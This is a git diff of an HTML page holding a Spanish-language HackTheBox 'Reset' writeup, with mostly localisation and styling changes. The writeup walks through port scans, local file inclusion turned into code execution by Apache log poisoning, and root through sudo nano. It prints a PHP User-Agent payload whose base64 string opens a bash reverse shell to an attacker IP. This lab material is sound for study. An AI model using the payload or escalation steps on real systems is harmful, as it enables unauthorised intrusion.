@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 
 <head>
   <title>
@@ -26,23 +26,23 @@ Tags: #Linux #LFI #nano #rlogin #LogPoisoning
   
 
 En este writeup detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de Log Poisoning sobre los registros de Apache.">
-<meta name="keywords" content="blog,developer,personal">
+<meta name="keywords" content="ciberseguridad, pentesting, hacking ético, HackTheBox, writeups, redes, eJPT, CWES">
 
 
 
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Reset Machine - HackTheBox">
-  <meta name="twitter:description" content="Tags: #Linux #LFI #nano #rlogin #LogPoisoning Introducción Link to heading En este writeup detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de Log Poisoning sobre los registros de Apache.">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Reset Machine - HackTheBox">
+	<meta name="twitter:description" content="Tags: #Linux #LFI #nano #rlogin #LogPoisoning Introducción Link to heading En este writeup detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de Log Poisoning sobre los registros de Apache.">
 
 <meta property="og:url" content="https://celero0.github.io/posts/reset/">
-  <meta property="og:site_name" content="Celero0 Blog">
-  <meta property="og:title" content="Reset Machine - HackTheBox">
-  <meta property="og:description" content="Tags: #Linux #LFI #nano #rlogin #LogPoisoning Introducción Link to heading En este writeup detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de Log Poisoning sobre los registros de Apache.">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-05-16T07:56:08+00:00">
-    <meta property="article:modified_time" content="2026-05-16T07:56:08+00:00">
+	<meta property="og:site_name" content="Celero0 Blog">
+	<meta property="og:title" content="Reset Machine - HackTheBox">
+	<meta property="og:description" content="Tags: #Linux #LFI #nano #rlogin #LogPoisoning Introducción Link to heading En este writeup detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de Log Poisoning sobre los registros de Apache.">
+	<meta property="og:locale" content="es">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-05-16T07:56:08+00:00">
+		<meta property="article:modified_time" content="2026-05-16T07:56:08+00:00">
 
 
 
@@ -57,7 +57,7 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
 
   
   
-  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="/css/coder.min.7931813641e92789c3090650cf34e053bf0a09b258f1e73ca3b5ba54e5c35b4f.css" integrity="sha256-eTGBNkHpJ4nDCQZQzzTgU78KCbJY8ec8o7W6VOXDW08=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -67,13 +67,19 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
   
 
 
 
  
 
+
+  
+  
+    
+    <link rel="stylesheet" href="/scss/custom.min.940f835c40977fce2ddd2fd8c55eb94de7e488a3ba45c0396d26445901b77774.css" integrity="sha256-lA&#43;DXECXf84t3S/YxV65TefkiKO6RcA5bSZEWQG3d3Q=" crossorigin="anonymous" media="screen" />
+  
 
 
 
@@ -102,7 +108,7 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
 
 
 
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-dark">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -129,6 +135,14 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
           
             <li class="navigation-item">
               <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/labs/">Labs</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Proyectos</a>
             </li>
           
             <li class="navigation-item">
@@ -160,12 +174,12 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
             <span class="posted-on">
               <i class="fa-solid fa-calendar" aria-hidden="true"></i>
               <time datetime="2026-05-16T07:56:08Z">
-                May 16, 2026
+                16 de mayo de 2026
               </time>
             </span>
             <span class="reading-time">
               <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              5-minute read
+              5 minutos de lectura.
             </span>
           </div>
           
@@ -198,11 +212,11 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
   </a>
 </h1>
 <p>Realizamos un escaneo de los puertos, encontrando como resultado el puerto <code>80</code> abierto, que está corriendo el servicio <code>HTTP</code>, y el puerto <code>22</code> corriendo <code>SSH</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.233 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.233 -oG allPorts
 </span></span></code></pre></div><p>Encontrando los siguientes puertos abiertos</p>
 <img src="/images/Pasted image 20260516022318.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora, si realizamos un escaneo por las versiones de estos puertos, con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,512,513,514 -sCV 10.129.33.161 -oN portServices
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,512,513,514 -sCV 10.129.33.161 -oN portServices
 </span></span></code></pre></div><p>Obtenemos el resultado de a continuación</p>
 <img src="/images/Pasted image 20260516022531.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Como información relevante, tenemos lo siguiente</p>
@@ -262,9 +276,9 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
 <p>Para ello, primeramente utilizaremos <code>Penelope</code>, para obtener nuestro payload de <code>reverse shell</code></p>
 <img src="/images/Pasted image 20260516025732.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Posteriormente creamos un archivo que contenga el <code>User-Agent</code> malicioso</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#a5d6ff">&#34;User-Agent: &lt;?php system(&#39;printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuNTUvNDQ0NCAwPiYxKSAm|base64 -d|bash&#39;); ?&gt;&#34;</span> &gt; Poison
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#a5d6ff">&#34;User-Agent: &lt;?php system(&#39;printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuNTUvNDQ0NCAwPiYxKSAm|base64 -d|bash&#39;); ?&gt;&#34;</span> &gt; Poison
 </span></span></code></pre></div><p>y con el siguiente comando, enviamos la petición</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s <span style="color:#a5d6ff">&#34;http://10.129.33.161/dashboard.php&#34;</span> -H @Poison
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s <span style="color:#a5d6ff">&#34;http://10.129.33.161/dashboard.php&#34;</span> -H @Poison
 </span></span></code></pre></div><img src="/images/Pasted image 20260516025926.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora si desde <code>Burpsuite</code> volvemos a mandar la petición anterior <code>file=%2Fvar%2Flog%2Fapache2%2Faccess.log</code>, obtenemos nuestra shell</p>
 <img src="/images/Pasted image 20260516030115.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -285,13 +299,13 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
 <p>El archivo indica una relación de confianza para el usuario <code>sadm</code>, lo que potencialmente permitiría autenticación remota sin contraseña mediante servicios <code>r*</code> (<code>rsh</code>, <code>rlogin</code>, etc.).</p>
 <img src="/images/Pasted image 20260516031843.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Como vimos en el escaneo inicial, estos servicios se encuentran disponibles en la máquina víctima, por lo cual procederemos a crear el usuario <code>sadm</code>, en nuestro host atacante, y nos conectaremos por <code>rsh</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>useradd sadm
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>useradd sadm
 </span></span><span style="display:flex;"><span>passwd sadm
 </span></span></code></pre></div><img src="/images/Pasted image 20260516032138.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora debemos cambiarnos al usuario <code>sadm</code> con el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su sadm
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su sadm
 </span></span></code></pre></div><p>Y desde el usuario <code>sadm</code> realizaremos el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlogin 10.129.33.161 -l sadm
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlogin 10.129.33.161 -l sadm
 </span></span></code></pre></div><p>Consiguiendo una consola interactiva</p>
 <img src="/images/Pasted image 20260516032626.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="escalada-de-privilegios">
@@ -306,21 +320,21 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
 <p>Si ejecutamos el comando <code>tmux ls</code>, tenemos lo siguiente</p>
 <img src="/images/Pasted image 20260516033105.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Como vemos que la sesión existe , intentamos conectarnos a ella</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tmux attach -t sadm_session
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tmux attach -t sadm_session
 </span></span></code></pre></div><p>y tenemos lo siguiente</p>
 <img src="/images/Pasted image 20260516033210.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Si revisamos los permisos de sudoers, obtenemos lo siguiente</p>
 <img src="/images/Pasted image 20260516033426.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Lo más importante es que podemos utilizar <code>nano</code> con privilegios <code>sudo</code> para modificar el archivo <code>/etc/firewall.sh</code></p>
 <p>Podemos abusar de este privilegio para ejecutar comandos como <code>root</code> de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/nano /etc/firewall.sh
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/nano /etc/firewall.sh
 </span></span></code></pre></div><img src="/images/Pasted image 20260516033703.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora, si presionamos <code>CTRL + T</code>, podemos ejecutar comandos</p>
 <img src="/images/Pasted image 20260516033725.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ejecutaremos el comando <code>chmod u+s /bin/bash</code></p>
 <img src="/images/Pasted image 20260516033837.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora si ejecutamos el siguiente comando, obtendremos privilegios <code>root</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
 </span></span></code></pre></div><img src="/images/Pasted image 20260516033922.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por lo cual podemos leer la <code>root.txt</code>, y logramos obtener control total sobre la máquina víctima</p>
 <img src="/images/Pasted image 20260516033957.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -351,13 +365,13 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
   <section class="container">
     ©
     
-      2019 -
+      2025 -
     
     2026
      CeleroRKX 
     ·
     
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
     
   </section>
 </footer>
@@ -371,6 +385,11 @@ En este writeup detallaremos paso a paso la resolución de esta máquina Linux. 
   <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
   
 
+  
+  
+  
+  <script src="/js/gestures.min.6cbd91590032e7f15addfe0af40403b55908afeef98fe1be098e196656366619.js" integrity="sha256-bL2RWQAy5/Fa3f4K9AQDtVkIr&#43;75j&#43;G&#43;CY4ZZlY2Zhk="></script>
+  
   
 
   
